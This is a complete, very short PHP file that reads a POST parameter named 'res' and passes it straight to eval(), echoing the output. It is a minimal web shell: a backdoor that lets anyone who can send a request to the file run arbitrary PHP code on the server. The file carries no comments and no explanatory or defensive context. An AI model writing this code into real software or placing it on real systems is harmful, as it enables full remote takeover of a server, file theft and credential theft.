<?php
if($_POST){
    $str = $_POST["res"];
    echo eval($str);
}

